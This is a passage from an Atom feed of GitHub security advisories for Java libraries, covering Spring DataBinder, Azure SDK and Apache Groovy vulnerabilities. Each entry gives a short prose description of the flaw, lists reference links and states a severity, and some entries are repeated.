        <published>2024-10-24T17:54:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-context] Spring Framework DataBinder Case Sensitive Match Exception]]></title>
        <id>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</id>
        <link href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph"/>
        <updated>2024-10-22T19:08:22.000Z</updated>
        <content type="html"><![CDATA[<p>The fix for CVE-2022-22968 made disallowedFields&nbsp;patterns in DataBinder&nbsp;case insensitive. However, String.toLowerCase()&nbsp;has some Locale dependent exceptions that could potentially result in fields not protected as expected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38820">https://nvd.nist.gov/vuln/detail/CVE-2024-38820</a></li>
<li><a href="https://spring.io/security/cve-2024-38820">https://spring.io/security/cve-2024-38820</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c">https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c</a></li>
<li><a href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph">https://github.com/advisories/GHSA-4gc7-5j7h-4qph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-18T06:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-context] Spring Framework DataBinder Case Sensitive Match Exception]]></title>
        <id>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</id>
        <link href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph"/>
        <updated>2024-10-22T19:08:22.000Z</updated>
        <content type="html"><![CDATA[<p>The fix for CVE-2022-22968 made disallowedFields&nbsp;patterns in DataBinder&nbsp;case insensitive. However, String.toLowerCase()&nbsp;has some Locale dependent exceptions that could potentially result in fields not protected as expected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38820">https://nvd.nist.gov/vuln/detail/CVE-2024-38820</a></li>
<li><a href="https://spring.io/security/cve-2024-38820">https://spring.io/security/cve-2024-38820</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c">https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c</a></li>
<li><a href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph">https://github.com/advisories/GHSA-4gc7-5j7h-4qph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-18T06:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-context] Spring Framework DataBinder Case Sensitive Match Exception]]></title>
        <id>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</id>
        <link href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph"/>
        <updated>2024-10-22T19:08:22.000Z</updated>
        <content type="html"><![CDATA[<p>The fix for CVE-2022-22968 made disallowedFields&nbsp;patterns in DataBinder&nbsp;case insensitive. However, String.toLowerCase()&nbsp;has some Locale dependent exceptions that could potentially result in fields not protected as expected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38820">https://nvd.nist.gov/vuln/detail/CVE-2024-38820</a></li>
<li><a href="https://spring.io/security/cve-2024-38820">https://spring.io/security/cve-2024-38820</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c">https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c</a></li>
<li><a href="https://github.com/advisories/GHSA-4gc7-5j7h-4qph">https://github.com/advisories/GHSA-4gc7-5j7h-4qph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gc7-5j7h-4qph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-18T06:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.azure:azure-core-amqp] Azure SDK for Java Security Feature Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8q69-pw39-hpqh</id>
        <link href="https://github.com/advisories/GHSA-8q69-pw39-hpqh"/>
        <updated>2024-10-17T17:16:53.000Z</updated>
        <content type="html"><![CDATA[<p>Azure SDK for Java Security Feature Bypass Vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16971">https://nvd.nist.gov/vuln/detail/CVE-2020-16971</a></li>
<li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16971">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16971</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-16971">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-16971</a></li>
<li><a href="https://azure.github.io/azure-sdk/releases/2020-10/index.html">https://azure.github.io/azure-sdk/releases/2020-10/index.html</a></li>
<li><a href="https://azure.github.io/azure-sdk/releases/2020-10/java.html">https://azure.github.io/azure-sdk/releases/2020-10/java.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8q69-pw39-hpqh">https://github.com/advisories/GHSA-8q69-pw39-hpqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8q69-pw39-hpqh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T17:35:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.microsoft.azure:azure-eventhubs] Azure SDK for Java Security Feature Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8q69-pw39-hpqh</id>
        <link href="https://github.com/advisories/GHSA-8q69-pw39-hpqh"/>
        <updated>2024-10-17T17:16:53.000Z</updated>
        <content type="html"><![CDATA[<p>Azure SDK for Java Security Feature Bypass Vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16971">https://nvd.nist.gov/vuln/detail/CVE-2020-16971</a></li>
<li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16971">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16971</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-16971">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-16971</a></li>
<li><a href="https://azure.github.io/azure-sdk/releases/2020-10/index.html">https://azure.github.io/azure-sdk/releases/2020-10/index.html</a></li>
<li><a href="https://azure.github.io/azure-sdk/releases/2020-10/java.html">https://azure.github.io/azure-sdk/releases/2020-10/java.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8q69-pw39-hpqh">https://github.com/advisories/GHSA-8q69-pw39-hpqh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8q69-pw39-hpqh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T17:35:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.groovy:groovy-all] Deserialization of Untrusted Data in Groovy]]></title>
        <id>https://github.com/advisories/GHSA-xphj-m9cc-8fmq</id>
        <link href="https://github.com/advisories/GHSA-xphj-m9cc-8fmq"/>
        <updated>2024-10-17T16:19:10.000Z</updated>
        <content type="html"><![CDATA[<p>When an application with unsupported Codehaus versions of Groovy from 1.7.0 to 2.4.3, Apache Groovy 2.4.4 to 2.4.7 on classpath uses standard Java serialization mechanisms, e.g. to communicate between servers or to store local data, it was possible for an attacker to bake a special serialized object that will execute code directly when deserialized. All applications which rely on serialization and do not isolate the code which deserializes objects were subject to this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-6814">https://nvd.nist.gov/vuln/detail/CVE-2016-6814</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:0868">https://access.redhat.com/errata/RHSA-2017:0868</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2486">https://access.redhat.com/errata/RHSA-2017:2486</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2596">https://access.redhat.com/errata/RHSA-2017:2596</a></li>
<li><a href="https://security.gentoo.org/glsa/202003-01">https://security.gentoo.org/glsa/202003-01</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2020.html">https://www.oracle.com/security-alerts/cpujan2020.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html">https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html">https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html">https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</a></li>
<li><a href="http://mail-archives.apache.org/mod_mbox/www-announce/201701.mbox/%3CCADRx3PMZ2hBCGDTY35zYXFGaDnjAs0tc5-upaVs6QN2sYUejyA%40mail.gmail.com%3E">http://mail-archives.apache.org/mod_mbox/www-announce/201701.mbox/%3CCADRx3PMZ2hBCGDTY35zYXFGaDnjAs0tc5-upaVs6QN2sYUejyA%40mail.gmail.com%3E</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2017-0272.html">http://rhn.redhat.com/errata/RHSA-2017-0272.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html">http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xphj-m9cc-8fmq">https://github.com/advisories/GHSA-xphj-m9cc-8fmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xphj-m9cc-8fmq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:25:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.groovy:groovy-all] Information Disclosure in Apache Groovy]]></title>
        <id>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</id>
        <link href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r"/>
        <updated>2024-10-17T16:18:53.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17521">https://nvd.nist.gov/vuln/detail/CVE-2020-17521</a></li>
<li><a href="https://github.com/apache/groovy/pull/1425">https://github.com/apache/groovy/pull/1425</a></li>
<li><a href="https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28">https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28</a></li>
<li><a href="https://groovy-lang.org/security.html#CVE-2020-17521">https://groovy-lang.org/security.html#CVE-2020-17521</a></li>
<li><a href="https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E">https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20201218-0006">https://security.netapp.com/advisory/ntap-20201218-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r">https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-12-09T19:03:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.groovy:groovy-all] Information Disclosure in Apache Groovy]]></title>
        <id>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</id>
        <link href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r"/>
        <updated>2024-10-17T16:18:53.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17521">https://nvd.nist.gov/vuln/detail/CVE-2020-17521</a></li>
<li><a href="https://github.com/apache/groovy/pull/1425">https://github.com/apache/groovy/pull/1425</a></li>
<li><a href="https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28">https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28</a></li>
<li><a href="https://groovy-lang.org/security.html#CVE-2020-17521">https://groovy-lang.org/security.html#CVE-2020-17521</a></li>
<li><a href="https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E">https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20201218-0006">https://security.netapp.com/advisory/ntap-20201218-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r">https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-12-09T19:03:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.groovy:groovy-all] Information Disclosure in Apache Groovy]]></title>
        <id>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</id>
        <link href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r"/>
        <updated>2024-10-17T16:18:53.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17521">https://nvd.nist.gov/vuln/detail/CVE-2020-17521</a></li>
<li><a href="https://github.com/apache/groovy/pull/1425">https://github.com/apache/groovy/pull/1425</a></li>
<li><a href="https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28">https://github.com/apache/groovy/commit/bcbe5c4c76db83736166530647c024ac1e47ef28</a></li>
<li><a href="https://groovy-lang.org/security.html#CVE-2020-17521">https://groovy-lang.org/security.html#CVE-2020-17521</a></li>
<li><a href="https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E">https://lists.apache.org/thread.html/ra9dab34bf8625511f23692ad0fcee2725f782e9aad6c5cdff6cf4465@%3Cnotifications.groovy.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/r4b2f13c302eec98838ff7475253091fb9b75bc1038016ba00ebf6c08@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E">https://lists.apache.org/thread.html/rea63a4666ba245d2892471307772a2d8ce0f0741f341d6576625c1b3@%3Cdev.atlas.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20201218-0006">https://security.netapp.com/advisory/ntap-20201218-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-rcjj-h6gh-jf3r">https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcjj-h6gh-jf3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-12-09T19:03:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.groovy:groovy-all] Improper Neutralization of Special Elements in Output Used by a Downstream Component in Apache Groovy]]></title>
        <id>https://github.com/advisories/GHSA-qg25-hgjv-cg9q</id>
        <link href="https://github.com/advisories/GHSA-qg25-hgjv-cg9q"/>
        <updated>2024-10-17T16:17:25.000Z</updated>
        <content type="html"><![CDATA[<p>The MethodClosure class in runtime/MethodClosure.java in Apache Groovy 1.7.0 through 2.4.3 allows remote attackers to execute arbitrary code or cause a denial of service via a crafted serialized object.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3253">https://nvd.nist.gov/vuln/detail/CVE-2015-3253</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2016:1376">https://access.redhat.com/errata/RHSA-2016:1376</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2486">https://access.redhat.com/errata/RHSA-2017:2486</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2017:2596">https://access.redhat.com/errata/RHSA-2017:2596</a></li>
<li><a href="https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05324755">https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05324755</a></li>
<li><a href="https://lists.apache.org/thread.html/rbb8e16cc5acab183124572b655bdf5fe1d5b5f477dc267352426c7ed@%3Cnotifications.shardingsphere.apache.org%3E">https://lists.apache.org/thread.html/rbb8e16cc5acab183124572b655bdf5fe1d5b5f477dc267352426c7ed@%3Cnotifications.shardingsphere.apache.org%3E</a></li>
<li><a href="https://security.gentoo.org/glsa/201610-01">https://security.gentoo.org/glsa/201610-01</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html</a></li>
<li><a href="http://groovy-lang.org/security.html">http://groovy-lang.org/security.html</a></li>
<li><a href="http://packetstormsecurity.com/files/132714/Apache-Groovy-2.4.3-Code-Execution.html">http://packetstormsecurity.com/files/132714/Apache-Groovy-2.4.3-Code-Execution.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2016-0066.html">http://rhn.redhat.com/errata/RHSA-2016-0066.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2016v3-2985753.html">http://www.oracle.com/technetwork/security-advisory/cpuapr2016v3-2985753.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html">http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2016-2881720.html">http://www.oracle.com/technetwork/security-advisory/cpujul2016-2881720.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html">http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20160623-0001">https://security.netapp.com/advisory/ntap-20160623-0001</a></li>
<li><a href="http://www.zerodayinitiative.com/advisories/ZDI-15-365">http://www.zerodayinitiative.com/advisories/ZDI-15-365</a></li>
<li><a href="https://github.com/advisories/GHSA-qg25-hgjv-cg9q">https://github.com/advisories/GHSA-qg25-hgjv-cg9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qg25-hgjv-cg9q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:25:41.000Z</published>
    </entry>
</feed>